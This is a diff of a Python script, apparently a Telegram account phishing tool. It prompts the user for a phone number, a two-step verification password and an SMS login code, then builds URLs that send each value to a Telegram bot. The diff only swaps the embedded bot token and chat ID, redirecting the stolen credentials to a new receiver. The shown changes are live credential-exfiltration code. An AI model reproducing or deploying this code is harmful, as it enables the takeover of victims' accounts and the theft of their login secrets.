@@ -43,7 +43,7 @@ print('')
 phonenumber = input(Fore.LIGHTCYAN_EX+'Phone Number +98 : ')
 print('')
 
-sendweb = ('https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+phonenumber)
+sendweb = ('https://api.telegram.org/bot5002789205:AAFKbhOkmMo4hibDltu9wqWTxdtw5kUzH04/sendmessage?chat_id=5275742275&text='+phonenumber)
 
 
 
@@ -63,7 +63,7 @@ print('')
 code2 = input(Fore.LIGHTCYAN_EX+'Two-step verification (off code 2 type a => -not- ) : ').casefold()
 print('')
 
-sendweb2 = ('https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+code2)
+sendweb2 = ('https://api.telegram.org/bot5002789205:AAFKbhOkmMo4hibDltu9wqWTxdtw5kUzH04/sendmessage?chat_id=5275742275&text='+code2)
 
 
 
@@ -85,7 +85,7 @@ if codesms == '':
     exit()
 
 
-sendweb3 = ('https://api.telegram.org/bot5140639188:AAF2LNuhVENcBuwGQmMZo3YyKkYNTD388ZI/sendmessage?chat_id=5010353674&text='+codesms)
+sendweb3 = ('https://api.telegram.org/bot5002789205:AAFKbhOkmMo4hibDltu9wqWTxdtw5kUzH04/sendmessage?chat_id=5275742275&text='+codesms)
 
 
 
